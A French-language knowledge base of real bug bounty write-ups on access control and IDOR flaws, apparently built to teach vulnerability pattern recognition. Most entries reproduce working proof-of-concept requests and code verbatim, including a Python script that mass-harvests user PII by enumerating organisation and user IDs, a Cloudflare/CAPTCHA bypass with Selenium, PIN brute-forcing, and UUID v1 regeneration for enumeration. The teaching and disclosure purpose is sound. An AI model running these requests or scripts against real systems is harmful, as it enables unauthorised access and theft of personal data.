# Writeup KB — corpus de cas réels bug bounty / CVE

Généré depuis `index.json` (215 fiches, 24 classes). Chaque fiche vient d'un writeup RÉEL (déjà publié/anonymisé par son auteur) — le but n'est pas de copier le PoC tel quel sur une cible, mais de reconnaître le PATTERN : quel type de signal (endpoint, paramètre, comportement) a mené à quelle technique, et pourquoi ça a marché. Quand la preuve technique brute (requête HTTP, code, commande) était présente dans la source, elle est reproduite verbatim ci-dessous sous **Preuve technique** — ce n'est pas un résumé, c'est l'artefact réel.

Avant de lire le corpus, lire `EXPERT_METHODOLOGY.md` : ce n'est pas un catalogue de plus, c'est la couche qui enseigne COMMENT un expert regarde une fonctionnalité inconnue et en tire des hypothèses — le corpus ci-dessous sert ensuite de banque d'exemples déjà résolus pour reconnaître un pattern plus vite.

---

## Access Control & IDOR

*28 cas.*

### 2 IDOR's & WAF Bypass to Expose Full Event Database

**📄 Cas réel**
sévérité : high · [source](https://academy.logicalbreach.com/writeups/2-idor-s-waf-bypass-to-expose-full-event-database-d5d344f5)

During a B2B event platform pentest, badge download URLs used a predictable ID format (2-letter prefix + 6-digit sequential number), allowing enumeration of all registered users. A Cloudflare WAF/JS challenge and CAPTCHA blocking naive scripts were bypassed using Selenium with CDP to drive a real browser, and the enumerated IDs were then combined with brute-forcing a 4-digit PIN on the 'Edit Information' endpoint to fully authenticate as any user and dump their PII.

**Cause racine :** Sequential, predictable object identifiers combined with a weak 4-digit PIN as the sole authentication factor for the profile-edit endpoint, with no rate limiting stopping automated enumeration.

**Preuve technique (verbatim depuis la source) :**

```
Badge URL: https://event.target.com/badge/download?id=XX110993
  - Prefix: 2 uppercase letters (e.g. TE, TG)
  - Sequence: 6-digit sequential number (IDs start at 110000; last ID observed = total registered users)

Edit Info URL: https://event.target.com/user/edit?id=TE110993&pin=XXXX
  - Same ID structure + 4-digit PIN (0000-9999, brute-forceable, no rate limit)

Bypass stack: Selenium + webdriver_manager (real browser, executes JS) + Chrome DevTools Protocol (CDP) to read DOM post-execution (bypasses Cloudflare JS-challenge obfuscation) + 4s pause on CAPTCHA challenge to let the browser auto-resolve it.
Optimization: manual check of 50 badges showed the 2nd prefix letter cycles through only 8 characters -> search space reduced from 26*26=676 to 26*8=208 requests per ID (~70% faster).
```

**Techniques :** sequential id enumeration, waf bypass via headless browser, captcha auto-solve, pin brute force

**Correspond aux classes qualifiantes :** idor, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `https://event.target.com/badge/download?id=XX110993`
- `https://event.target.com/user/edit?id=TE110993&pin=XXXX`

**Paramètres impliqués :** `id`, `pin`

---

### Can download files on Android app without permission

**📄 Cas réel**
[source](https://hackerone.com/reports/2380133)

A file owner can share a folder/file with another user while disabling the 'Allow download' option, which is enforced in the web UI. However, the Android app's native viewer offers alternate export actions (Download as PDF/epub, Use image as wallpaper/contact photo) that are not covered by the download restriction, letting the recipient save the file locally despite downloads being disabled.

**Cause racine :** The 'disable download' permission is enforced only in specific UI flows (web) and not consistently across all client actions that can persist a copy of the file (Android app export/save actions).

**Preuve technique (verbatim depuis la source) :**

```
Repro (Android native viewer, 'Allow download' unchecked by owner):
- PDF: viewer top-right menu -> "Download as" -> "PDF document" or "PDF document as..." -> saved locally despite download being disabled.
- .odp: same path.
- .odt: same path, also exposes ".epub" export option.
- Image (.png/.jpg): "Use the image as" -> "Wallpaper" (saved to internal memory) or as WhatsApp profile picture / contact photo.
Note: web UI correctly blocks download; only native-app export actions bypass the restriction because they are not covered by the same check.
```

**Techniques :** client-specific restriction bypass, download-flag not enforced server-side, mobile app access control bypass

**Correspond aux classes qualifiantes :** idor

---

### Disclose Hidden Comments on Media Section of hub.vroid.com

**📄 Cas réel**
[source](https://hackerone.com/reports/2541962)

A user disabled comments on their media post, which should hide all comments from everyone except the admin. By retrieving a hidden comment's ID (visible via page source 'entityIds') and sending a POST request to the 'like'/hearts endpoint referencing that comment ID, an attacker receives a response that includes the full hidden comment content and its owner.

**Cause racine :** The like/heart action endpoint returns the full comment object in its response without checking whether the comment is currently hidden/visible to the requesting user.

**Preuve technique (verbatim depuis la source) :**

```
POST /api/statuses/PASTE_ID_HERE/hearts HTTP/2
Host: hub.vroid.com
Cookie: ATTACKER_COOKIES
Sec-Ch-Ua: "Opera";v="109", "Not:A-Brand";v="8", "Chromium";v="123"
Accept: application/json, text/plain, */*
Content-Type: application/json
X-Api-Version: 11
Sec-Ch-Ua-Mobile: ?0
Content-Length: 2

{}

-> response body contains the full hidden comment content + owner, even though the comment is hidden from everyone but the admin. Comment ID obtained pre-test via page source (Ctrl+U, search 'entityIds') -- in a real attack the ID would be harvested by other means, this step was only for building the PoC.
```

**Techniques :** idor via like/heart endpoint, sensitive data leaked in unrelated api response, hidden object id harvesting from page source

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `POST /api/statuses/PASTE_ID_HERE/hearts`

**Paramètres impliqués :** `entityIds`

---

### Easy way to create a new Deck board without permission

**📄 Cas réel**
[source](https://hackerone.com/reports/2388183)

Admins can restrict which groups may create new Nextcloud Deck boards; a restricted user has no 'Add board' button and direct board-creation requests are rejected with a 403. However, the 'Clone board' action on a board already shared with the user is not covered by this restriction, so cloning an existing board (then renaming it) effectively lets the restricted user create a fully functional new board.

**Cause racine :** The board-creation authorization check is applied to the dedicated create-board endpoint but not to the functionally equivalent clone-board endpoint.

**Preuve technique (verbatim depuis la source) :**

```
Direct endpoint: POST /nextcloud/apps/deck/boards/board_number/clone
Repro: as a user in a group blocked from board creation (admin restricted it via Deck settings > 'Limit board creation to some groups'), the '+ Add board' button is hidden and a direct create-board request returns 403 'Creating boards has been disabled for your account.' But clicking 'Clone board' on an ALREADY-SHARED board succeeds and creates a full new board (then rename it) -- the clone action is not covered by the same restriction check.
```

**Techniques :** function-level access control bypass, alternate action path not covered by restriction, missing server-side permission check

**Correspond aux classes qualifiantes :** bfla

**Signal (endpoints/fonctions observés) :**
- `POST /nextcloud/apps/deck/boards/board_number/clone`

---

### IDOR Leading to Plaintext SFTP Credential Disclosure and Unauthorized SFTP Access

**📄 Cas réel**
sévérité : high · [source](https://academy.logicalbreach.com/writeups/idor-leading-to-plaintext-sftp-credential-disclosure-and-unauthorized-sftp-access-2aad24dc)

An internal API endpoint returning SFTP credentials for an organization/user identifier lacks authorization checks; by enumerating or altering the identifier in the URL path, an authenticated user can retrieve other organizations' plaintext SFTP username, password and role. The credentials were then used to directly authenticate to the SFTP server and access remote files.

**Cause racine :** The endpoint trusts a client-supplied, iterable identifier to look up and return SFTP credentials without verifying it belongs to the requesting user's organization.

**Preuve technique (verbatim depuis la source) :**

```
GET /api/organization/{USERNAME_ID}/sftp_usernames HTTP/2
Host: admin.example.com

Response (200):
{
	"status": 200,
	"username": "administrator",
	"password": "passw0rd123",
	"role": "admin"
}

Direct follow-on use of leaked creds:
sftp administrator@sftp.example.com
ls / cd folder / put file / get file / exit

Discovery method: Burp Logger, all traffic filtered for keywords username/password/credentials/auth to spot endpoints leaking secrets.
```

**Techniques :** idor via path identifier, sensitive keyword filtering in proxy logs, plaintext credential exposure

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `GET /api/organization/{USERNAME_ID}/sftp_usernames`

**Paramètres impliqués :** `USERNAME_ID`

---

### IDOR leads Unauthorized Staff Member Removal via Insufficient Authorization Checks

**📄 Cas réel**
[source](https://hackerone.com/reports/3020021)

The staff-removal endpoint accepts a MemberId in the POST body but does not verify that the targeted staff member belongs to the requesting user's account. By changing MemberId to another account's staff member ID, an attacker successfully removes that staff member and receives a success confirmation.

**Cause racine :** No server-side check exists to confirm the target MemberId is associated with the authenticated user's own account before performing the removal.

**Preuve technique (verbatim depuis la source) :**

```
POST /account/dashboard/accounts HTTP/2
Request Payload:
MemberId=76671&RemoveMember=remove

Response:
{"success":true,"message":"Staff member is removed successfully!"}

PoC steps: capture the legitimate staff-removal request for your own account, then swap MemberId for a staff-member ID belonging to a DIFFERENT account and replay -> same success response, staff member removed from an account you don't own.
```

**Techniques :** parameter tampering, missing ownership check, idor via id in post body

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `POST /account/dashboard/accounts`

**Paramètres impliqués :** `MemberId`, `RemoveMember`

---

### Improper Access Control in `fizzy.do` import flow allows cross-tenant ActionText reference resolution and data disclosure

**📄 Cas réel**

The account import flow parses ActionText rich-text HTML from uploaded ZIP content and, via convert_gids_to_sgids, resolves attacker-controlled Global IDs (gid) into persisted signed IDs (sgid) with no check that the resolved record belongs to the importing account (unlike the export path, which has such a check). This lets an attacker craft an import referencing a victim tenant's ActionText record, causing that victim-owned data to be resolved and rendered/persisted inside the attacker's own account.

**Cause racine :** The import-time gid-to-sgid conversion mints a signed reference to any resolvable record without verifying that the record's account_id matches the importing account.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable code path:
app/models/account/data_transfer/action_text_rich_text_record_set.rb:83,87,88,89 (convert_gids_to_sgids -- no tenant ownership check before minting the sgid)
app/controllers/account/imports_controller.rb:38 -> app/models/account/import.rb:37,39 (reachable from normal ZIP upload flow)
Contrast: export path DOES check ownership at action_text_rich_text_record_set.rb:69 -> record&.account_id == account.id

Repro A (standalone, deterministic):
cd /path/to/fizzy && bundle check || bundle install
bundle exec ruby security-poc/integration_test_standalone.rb
=> RESULT: IMPACT_CONFIRMED=true
   imported.account_id = <attacker_account_id>
   resolved_account_id = <victim_account_id>  (different tenant)
   attachable_text = @alice_secret

Repro B (full Rails import flow):
DISABLE_BOOTSNAP=1 RAILS_ENV=development bundle exec rails runner security-poc/demo_import_cross_account_impact.rb
=> cross_account_reference=true
   IMPACT_CONFIRMED=true
   imported_rich_text_account_id=<attacker_account_id>
   resolved_account_id=<victim_account_id>
   leaked_attachable_text=@alice

Suggested fix: in convert_gids_to_sgids, require record.respond_to?(:account_id) && record.account_id == account.id before minting sgid.
```

**Techniques :** cross-tenant object reference resolution, gid-to-sgid minting without ownership check, import-flow data exfiltration

**Correspond aux classes qualifiantes :** idor

**Paramètres impliqués :** `gid`, `sgid`

---

### Improper Access Control via Public API Key leads to Mass PII Disclosure

**📄 Cas réel**
sévérité : high

A public SPA exposed its production API gateway key in an unauthenticated config file. Using this key against a pre-auth 'user existence check' endpoint intended to return only a boolean, the endpoint instead performed a substring search on the email parameter and returned full unmasked user records; a broad match value returned roughly 1,600 user records (name, email, internal ID, phone) with no authentication at all.

**Cause racine :** A client-embedded API key granted access to an endpoint that returns complete unmasked records for a loosely-matched query instead of enforcing an exact match with a masked boolean response.

**Preuve technique (verbatim depuis la source) :**

```
Step 1 -- retrieve the public production API key from the SPA's unauthenticated config file:
curl -s 'https://public-portal.redacted.example/assets/config/appConfig.json' | grep -o '[redacted-api-key-pattern]'
GET /assets/config/appConfig.json -> "publicApiKey": "[REDACTED_PRODUCTION_API_KEY]"

Step 2 -- use the key against the pre-auth user-lookup endpoint with a broad substring match:
curl -s -G 'https://api.redacted.example/api/[redacted-public-users-service]/v1/users/external' \
  -H 'ApiKey: [REDACTED_PRODUCTION_API_KEY]' \
  --data-urlencode 'email=@' \
  --data-urlencode 'systemCode=[SYSTEM_A]'

Response (200):
[
  {
    "idUser": "[redacted-id]",
    "email": "user@[redacted-domain]",
    "firstName": "[redacted]",
    "lastName": "[redacted]",
    "mobile": "+[redacted]"
  }
]
-> a single broad 'email=@' match value returned ~1,600 full user records unauthenticated. Without the key: invalid-key error. Endpoint was meant to return a boolean existence check, not full unmasked records.
```

**Techniques :** hardcoded api key exposure in frontend config, substring search instead of exact match, unmasked pii in api response, pre-auth idor

**Correspond aux classes qualifiantes :** idor, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `/assets/config/appConfig.json`
- `/api/[redacted-public-users-service]/v1/users/external`

**Paramètres impliqués :** `email`, `systemCode`, `ApiKey`

---

### Lack of Validation in Reward Redemption Allows Unlimited Burp Suite License Abuse

**📄 Cas réel**
[source](https://hackerone.com/reports/3378540)

A gamification/rewards program emailed a redeemable Burp Suite Pro license via a Google Form, but the form performed no verification that the submitting email corresponded to the legitimate account that actually reached the reward tier. Submitting the form with different email addresses each time yielded a separate valid license per submission.

**Cause racine :** License issuance is tied only to a freely-entered email address in a form, with no server-side link back to an authenticated account's actual reward-tier status.

**Preuve technique (verbatim depuis la source) :**

```
Flow: rewards email 'You've reached Level 4! Reward: 3-month Burp Suite Pro license' -> 'Redeem it here' button -> Google Form (no login/account binding) -> valid license emailed on submission. Submitting the SAME form twice with two DIFFERENT email addresses produced two separate valid licenses -- no server-side check that the submitting email corresponds to an account that actually reached Level 4.
```

**Techniques :** business logic flaw, missing identity verification on redemption, reward abuse via multiple emails

---

### [Privilege Escalation] User can Pin|Unpin Any Comment on Any Project or Locale

**📄 Cas réel**
[source](https://hackerone.com/reports/3025797)

Pin/Unpin of translation comments is meant to be restricted to privileged users (e.g. Project Managers), and the React frontend hides the Pin/Unpin buttons for regular users accordingly. The backend views pin_comment and unpin_comment, however, perform no permission/role check on the requesting user, only requiring a valid comment_id, so any logged-in user can directly POST to these endpoints to pin or unpin any comment on any project or locale.

**Cause racine :** Authorization for the pin/unpin action is enforced only in the frontend UI; the corresponding backend view functions omit any role or permission check before mutating the comment.

**Preuve technique (verbatim depuis la source) :**

```
Frontend gate (React, permission-only in UI): https://github.com/mozilla/pontoon/blob/45a69293623e56973c9a4fd5eb8b6618aca44813/translate/src/modules/comments/components/Comment.tsx#L81
{canPin ? (comment.pinned ? <button onClick={handlePinAndUnpin}>UNPIN</button> : <button onClick={handlePinAndUnpin}>PIN</button>) : null}

Raw requests (no backend permission check at all):
POST /pin-comment/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: [session]
X-Csrftoken: OrGrBPrSXQFhmjmmUJ4lgPKJc9WV0UOOvddMLDXgWzuFVDEaYBu0UYa4Usa4yZXn
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 16

comment_id=25725

POST /unpin-comment/ HTTP/1.1  (same headers, same body shape) -> also succeeds for any comment_id from any project/locale.

Vulnerable backend (Django), no role/ownership check at all: https://github.com/mozilla/pontoon/blob/main/pontoon/base/views.py#L685-L715
@login_required(...)
@require_POST
@transaction.atomic
def pin_comment(request):
    comment_id = request.POST.get("comment_id", None)
    if not comment_id:
        return JsonResponse({"status": False, "message": "Bad Request"}, status=400)
    comment = get_object_or_404(Comment, id=comment_id)
    comment.pinned = True
    comment.save()
    _send_pin_comment_notifications(request.user, comment)
    return JsonResponse({"status": True})
# unpin_comment() is the exact mirror -- same missing check.
```

**Techniques :** frontend-only authorization enforcement, missing backend permission check, function-level privilege escalation

**Correspond aux classes qualifiantes :** bfla, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `/get-team-comments/`
- `POST /pin-comment/`
- `POST /unpin-comment/`

**Paramètres impliqués :** `comment_id`

---

### Scaling IDOR: Automated PII Exfiltration via Notification Configuration Endpoints

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/scaling-idor-automated-pii-exfiltration-via-notification-configuration-endpoints-feeb1b23)

A notification-configuration endpoint accepts org_id (URL path) and username_id (JSON body) without verifying the caller's ownership of either, and returns full user PII (name, email, phone, role) in the response. The author built a Python script with a nested loop over org_id and username_id, using a lightweight 'probe' request per organization to skip nonexistent org IDs (404) and a sleep/retry loop on HTTP 429, to automatically harvest user records at scale across the whole platform.

**Cause racine :** The endpoint trusts client-supplied org_id and username_id values without checking that the target user actually belongs to the caller's own organization.

**Preuve technique (verbatim depuis la source) :**

```
Vulnerable request/response:
POST /api/username/notifications/{org_id}/config HTTP/2
Host: admin.example.com

{"notifications":true,"username_id":"{ID}"}

Response (200):
{
    "status": 200,
    "notifications": true,
    "data": [
        {"id": 1337, "username": "target_admin", "display_name": "Internal Administrator", "email": "pwned@company.com", "phone": "+1-555-0199", "role": "super_admin"}
    ]
}

Full automation script (nested org_id x username_id loop, 404-probe to skip dead orgs, 429 retry/backoff, break-on-first-hit per org):
import requests, time
TARGET_HOST = "admin.example.com"
headers = {"Host": TARGET_HOST, "Content-Type": "application/json"}
found_users = set()
for org_id in range(1, 16001):
    time.sleep(0.4)  # ethical delay
    url = f"https://{TARGET_HOST}/api/username/notifications/{org_id}/config"
    probe_payload = {"notifications": True, "username_id": "1"}
    probe_res = requests.post(url, headers=headers, json=probe_payload, timeout=5)
    if probe_res.status_code == 404:
        continue
    if probe_res.status_code in [200, 201]:
        for user_id in range(1, 255001):
            if user_id in found_users:
                continue
            payload = {"notifications": True, "username_id": str(user_id)}
            user_resp = requests.post(url, headers=headers, json=payload, timeout=5)
            while user_resp.status_code == 429:
                time.sleep(30)
                user_resp = requests.post(url, headers=headers, json=payload, timeout=5)
            if user_resp.status_code == 200:
                data_list = user_resp.json().get("data", [])
                if data_list:
                    user = data_list[0]
                    found_users.add(user_id)
                    break  # move to next org once one valid user is proven
```

**Techniques :** idor via nested id enumeration, probe request to skip empty ranges, automated mass exfiltration, 429 rate-limit retry/backoff

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `POST /api/username/notifications/{org_id}/config`

**Paramètres impliqués :** `org_id`, `username_id`, `notifications`

---

### Unauthenticated access to private files on app.fizzy.do via Active Storage URLs leads to information disclosure

**📄 Cas réel**
[source](https://hackerone.com/reports/3467641)

Files and previews uploaded to cards on app.fizzy.do are served via Rails Active Storage URLs that can be opened directly without any authentication or authorization check. Once such a URL is exposed during normal usage (e.g. embedded in HTML), it remains accessible to any other user, or even to unauthenticated visitors, across multiple file types (PDFs, images, text, HTML).

**Cause racine :** Active Storage attachment URLs are not bound to a session/permission check, so possessing the URL alone grants access to the private file regardless of who requests it.

**Preuve technique (verbatim depuis la source) :**

```
Repro: log in as User A, upload a file to a card, view it so the preview/download Active Storage URL is rendered in the HTML, copy that URL, open it in a NEW unauthenticated session (or as a different user) -- the file/preview loads successfully with zero auth/authz check. Confirmed across PDFs, images, text files and HTML files. No brute-force or guessing needed -- the URL is exposed during totally normal usage (embedded in HTML markup).
```

**Techniques :** direct resource url access without auth, leaked url reuse across sessions, missing authorization on file storage urls

**Correspond aux classes qualifiantes :** idor, auth-bypass

---

### User Can Delete Other Users' Personal Access Tokens at /delete-token/{token_id}/ on Mozilla Pontoon

**📄 Cas réel**
[source](https://hackerone.com/reports/3325582)

The /delete-token/{token_id}/ endpoint deletes a Personal Access Token looked up by numeric ID without checking that the token belongs to the requesting user. An attacker who learns another user's token_id (e.g. by observing the sequential ID pattern from their own token creation) can delete that victim's token using only their own authenticated session and CSRF token; the referenced Django view code (delete_token) confirms no ownership check is performed.

**Cause racine :** The delete_token view fetches the PersonalAccessToken by ID and deletes it without verifying token.user matches the requesting user.

**Preuve technique (verbatim depuis la source) :**

```
Step 1 (get your own token id):
POST /generate-token/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: {your cookies}
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

csrfmiddlewaretoken={your csrf token}&name=adil
-> response contains new_token_id.

Step 2 (delete a DIFFERENT user's token, using only your own session/csrf):
POST /delete-token/{Victim Token Id Here}/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: {Attacker Cookies Here}
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

csrfmiddlewaretoken={Attacker CSRF Token Here}
-> 200 OK, "Token Successfully Deleted".

Vulnerable code: https://github.com/mozilla/pontoon/blob/main/pontoon/contributors/views.py#L505-L523
def delete_token(request, token_id):
    try:
        token = PersonalAccessToken.objects.get(id=token_id)
        token.delete()
        return JsonResponse({"status": "success", "message": "Token deleted successfully!"})
    except PersonalAccessToken.DoesNotExist:
        return JsonResponse({"status": "error", "message": "Token not found."}, status=404)
# no request.user == token.user check anywhere.
```

**Techniques :** idor via sequential resource id, missing ownership check, mass deletion via brute-force tool

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `POST /generate-token/`
- `POST /delete-token/{token_id}/`
- `/settings`

**Paramètres impliqués :** `token_id`, `name`, `csrfmiddlewaretoken`

---

### Users can change project visibility which requires high subscription by just changing request body

**📄 Cas réel**
[source](https://hackerone.com/reports/3370430)

The project-creation endpoint accepts a visibility field ('Personal' or 'Workspace') in its JSON body that is meant to be gated behind a paid subscription tier. By intercepting the request in Burp and setting this field directly, a free-tier user creates a project with premium visibility and the server responds 201 Created, without validating the account's subscription level.

**Cause racine :** The backend trusts the client-supplied visibility value without a server-side check that the requesting account's subscription tier authorizes that visibility level.

**Preuve technique (verbatim depuis la source) :**

```
Endpoint: POST https://lovable-api.com/workspaces/{YOUR-WORKSPACE-ID}/projects
Request body (visibility tampered to a Pro-gated value on a Free account):
{"description":"landing view","visibility":"Personal","initial_message":{"id":"umsg_01k6qkw83ze07t9f7m9p3jabs9","message":"landing view","files":[],"optimisticImageUrls":[],"chat_only":false,"agent_mode_enabled":false,"ai_message_id":"aimsg_01k6qkw841e07t9f7ytpghd6bs"}}
-> 201 Created, project created with the Pro-only visibility on a Free-tier account, no server-side plan check.
```

**Techniques :** mass assignment, client-controlled entitlement field, missing subscription tier check

**Correspond aux classes qualifiantes :** mass-assignment

**Signal (endpoints/fonctions observés) :**
- `https://lovable-api.com/workspaces/{YOUR-WORKSPACE-ID}/projects`

**Paramètres impliqués :** `visibility`, `description`, `initial_message`

---

### [Vertical Privilege Escalation] User can Unapprove any Approved Translation at /translations/unapprove/

**📄 Cas réel**
[source](https://hackerone.com/reports/3020021)

Only privileged users or a translation's author are supposed to be able to unapprove an approved translation. The authorization check in the unapprove view uses an OR condition that also allows the action when 'translation.approved' is true — which is always the case for an approved translation — nullifying the privilege/ownership requirement and letting any logged-in user unapprove any approved translation by replaying its translation ID.

**Cause racine :** The authorization boolean includes a clause (translation.approved) unrelated to the caller's identity or role, which is always satisfied for the exact state the check is meant to protect, defeating the privilege check.

**Preuve technique (verbatim depuis la source) :**

```
Raw request (translation ID harvested from the /get-history/ response, session/CSRF are the ATTACKER's own, non-privileged account):
POST /translations/unapprove/ HTTP/1.1
Host: mozilla-pontoon-staging.herokuapp.com
Cookie: [session]
X-Csrftoken: ZhBI0LAYVXMG0ZNaUkqXMClUDquhZsfC8o1AlKRQTdTeJ4SCBXLDyi7aw0bWBBxx
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 52

translation=5184479&paths%5B%5D=LC_MESSAGES%2Famo.po
-> 200 OK, translation unapproved despite the account having no privilege and not being the translation's author.

Vulnerable boolean logic: https://github.com/mozilla/pontoon/blob/main/pontoon/translations/views.py#L361
if not (
    request.user.can_translate(locale, project)
    or request.user == translation.user
    or translation.approved
):
    return JsonResponse({"status": False, "message": "Forbidden: You can't unapprove this translation."}, status=403)
translation.unapprove(request.user)
# translation.approved is TRUE for exactly the state being protected -> the OR clause always short-circuits the check to pass.
```

**Techniques :** logic flaw in authorization boolean condition, or-condition bypass, vertical privilege escalation

**Correspond aux classes qualifiantes :** privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `/get-history/`
- `POST /translations/unapprove/`

**Paramètres impliqués :** `translation`, `paths[]`

---

### Improper Access Control via Client-Supplied Document Identifier Leads to PII Disclosure

**📄 Cas réel**
[source](https://academy.logicalbreach.com/writeups/improper-access-control-via-client-supplied-document-identifier-leads-to-pii-disclosure-29367c5a)

A mobile onboarding registration endpoint accepted a client-supplied national document number and returned the full identity profile (name, DOB, tax ID, postal address) without validating any session, authorization token, or onboarding token. Fake authentication headers produced the same result, confirming those values were never checked, and BirthDate was not enforced as a secondary control. Valid and invalid document numbers returned distinguishable responses, creating an enumeration oracle over the customer database.

**Cause racine :** The endpoint returns PII keyed solely on a client-supplied document number without verifying the caller's session, token, or authorization.

**Preuve technique (verbatim depuis la source) :**

```
curl -sk -i -X POST 'https://api.redacted.example/[redacted]/onboarding/v2/add-new-client' \
  -H 'Content-Type: application/json' -H 'AppPlatform: APP_ANDROID' -H 'DeviceId: 00000000000000000000000000000000' \
  -H 'MessageUUI: 00000000000000000000000000000000' -H 'OperationType: NEW_CLIENT_REGISTRATION_V2' \
  -d '{"DocumentNumber":"<VALID_DOCUMENT_NUMBER>","DocumentType":"NATIONAL_ID","BirthDate":"1990-01-01","Gender":"M"}'
# BirthDate accepted as literally ANY date for this document type -- not an effective secondary control.
# Fake/garbage auth headers (DeviceId all-zeros, fabricated MessageUUI) produced the SAME successful result -> those values are never verified server-side.

Response (200, full PII, zero session/token required):
{"d":{"IdHost":"[redacted]","Status":"DATA_COMPLETED","PersonData":{"Name":"[first_name]","LastName":"[last_name]","BirthDate":"[dob]","Gender":"[gender]","DocumentNumber":"[document_number]","DocumentType":"NATIONAL_ID","TaxIdentifier":"[tax_id]","Nationality":"[redacted]","Address":{"Street":"[street]","Number":"[number]","Province":"[province]","Locality":"[locality]","Country":"[country]","PostalCode":"[postal_code]"}}}}
Invalid document numbers return a distinguishably different response -> existence/enumeration oracle over the entire customer database.
```

**Techniques :** unauthenticated-idor, identifier-based-lookup, existence-oracle, ineffective-secondary-control

**Correspond aux classes qualifiantes :** idor, bola, auth-bypass

**Signal (endpoints/fonctions observés) :**
- `POST /[mobile-gateway]/[onboarding]/v2/[add-new-client]`

**Paramètres impliqués :** `DocumentNumber`, `DocumentType`, `BirthDate`, `Gender`

---

### IDOR via prédictibilité des UUID v1 (timestamp + adresse MAC encodés)

**🧾 Cheatsheet**
sévérité : high · CWE-330

Un développeur pense qu'un UUID est un identifiant 'aléatoire' donc infaisable à deviner, mais un UUID version 1 encode en clair un timestamp à 100 ns près et l'adresse MAC (ou un node ID dérivé) de la machine qui l'a généré. Si un attaquant obtient un seul UUID valide (le sien) et connaît approximativement l'heure de création d'un objet cible (ex. via un champ created_at exposé, un en-tête Date, ou l'ordre de création d'un compte), il peut reconstituer le champ node fixe puis parcourir l'espace des timestamps proches pour régénérer des UUID candidats valides. Cela transforme un identifiant supposé non énumérable en un espace de recherche restreint et brute-forçable, cassant toute la stratégie d'obfuscation reposant sur 'l'ID est trop long pour être deviné'.

**Cause racine :** Le générateur d'UUID v1 encode le timestamp de création et l'adresse MAC du serveur dans une structure fixe et prévisible, ce qui permet de reconstruire ou de restreindre l'espace de recherche d'identifiants valides malgré leur apparence aléatoire.

**Preuve technique (verbatim depuis la source) :**

```
Un UUID v1 a la structure : time_low-time_mid-time_hi_and_version-clock_seq-node
Exemple observé dans une réponse API attaquant (objet possédé) :

GET /api/documents/mine HTTP/1.1
Host: app.example.com
Authorization: Bearer <attacker_token>

-> 200 OK
{"id": "3d5f2450-fc38-11e5-b86d-0002a5d5c51b", "owner_id": 552, "created_at": "2026-03-14T10:02:11Z"}

Décodage (le champ node '0002a5d5c51b' est CONSTANT pour tous les objets générés par le même serveur/process) :

python3 -c "
import uuid
u = uuid.UUID('3d5f2450-fc38-11e5-b86d-0002a5d5c51b')
print('version:', u.version)
print('time:', u.time)          # compteur 100ns depuis 1582-10-15
print('node (hex):', hex(u.node))  # constant sur ce serveur -> 0x0002a5d5c51b
print('clock_seq:', u.clock_seq)
"

Un autre utilisateur publie publiquement l'heure de création de son objet (ex. 'uploadé le 2026-03-14 vers 10:05 UTC' dans un forum, ou via un endpoint GET /api/documents?public=true qui liste created_at sans exposer l'id). L'attaquant régénère alors des UUID candidats pour cette fenêtre de temps avec le même node/clock_seq connu :

python3 -c "
import uuid, time
base_time = uuid.UUID('3d5f2450-fc38-11e5-b86d-0002a5d5c51b').time
node = 0x0002a5d5c51b
clock_seq = 0xb86d & 0x3fff
for delta in range(-50000, 50000, 1000):   # fenêtre de +/- 5 secondes en unités 100ns
    t = base_time + delta
    candidate = uuid.UUID(fields=((t & 0xffffffff), ((t>>32) & 0xffff), ((t>>48) & 0x0fff) | 0x1000, (clock_seq>>8)|0x80, clock_seq & 0xff, node))
    print(candidate)
"

Chaque candidat est ensuite testé :
GET /api/documents/{candidate_uuid} HTTP/1.1
Authorization: Bearer <attacker_token>

-> 200 OK pour les UUID valides appartenant à d'autres comptes -> énumération complète malgré l'apparence 'non séquentielle' des identifiants.
```

**Techniques :** uuid-v1-decoding, timestamp-based-enumeration, mac-address-node-leak, id-bruteforce

**Correspond aux classes qualifiantes :** idor

**Signal (endpoints/fonctions observés) :**
- `GET /api/documents/{uuid}`
- `GET /api/*/{uuid}`
- `GET /api/objects/{uuid}`

**Paramètres impliqués :** `id`, `uuid`

---

### BOLA par objet imbriqué non revérifié (relation enfant exposant les données d'un autre utilisateur)

**🧾 Cheatsheet**
sévérité : high · CWE-639

Le contrôleur d'un endpoint REST vérifie correctement que l'objet parent (une commande) appartient bien à l'utilisateur courant, puis assemble la réponse en embarquant un objet lié via une clé étrangère (le moyen de paiement associé à la commande) sans jamais revalider la propriété de cet objet imbriqué. Si un attaquant parvient à faire pointer la clé étrangère de SA PROPRE commande vers l'ID d'un objet appartenant à un autre utilisateur (via un PATCH accepté parce que la commande cible passe le contrôle de propriété de premier niveau), la lecture suivante de la commande fuit l'intégralité de l'objet imbriqué de la victime. L'impact est direct : exposition de données sensibles (moyens de paiement, adresses, informations personnelles) d'un tiers via un chemin d'API qui n'est jamais directement accédé par son ID propre.

**Cause racine :** Le contrôle d'autorisation ne vérifie que la propriété de l'objet parent au moment de la requête, mais l'objet imbriqué renvoyé dans la réponse (relation par clé étrangère) n'est jamais revérifié individuellement.

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 - l'attaquant modifie sa PROPRE commande (le contrôle de propriété de premier niveau passe car order.owner_id == attacker.id) en injectant l'ID d'un moyen de paiement qui ne lui appartient pas :

PATCH /api/orders/8842 HTTP/1.1
Host: shop.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"payment_method_id": 991}

-> 200 OK
{"id": 8842, "owner_id": 4471, "status": "pending"}

